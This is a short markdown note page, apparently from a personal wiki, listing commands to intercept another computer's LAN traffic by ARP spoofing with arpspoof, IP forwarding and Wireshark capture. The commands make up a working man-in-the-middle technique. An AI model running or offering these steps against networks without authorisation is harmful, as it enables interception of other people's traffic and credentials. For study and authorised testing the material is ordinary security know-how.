---
title: Wireshark
bookCollapseSection: true
weight: 643
---

### Sniff lan traffic

* Install `dsniff` o any package that furnishes `arpspoof`
* Enable IP forwarding with `echo 1 > /proc/sys/net/ipv4/ip_forward`
* Start the Arp spoofing with `arpspoof -i eth0 -t 192.168.0.3 192.168.0.1` where `-t` is the target ip and the following is the ip of the gateway. This way the target computer will think our computer is the gateway and will route all packets through it. The local pc will then forward all the packets to the real gateway
* Use Wireshark on the local network interface (eth0, in the above case) to sniff the traffic
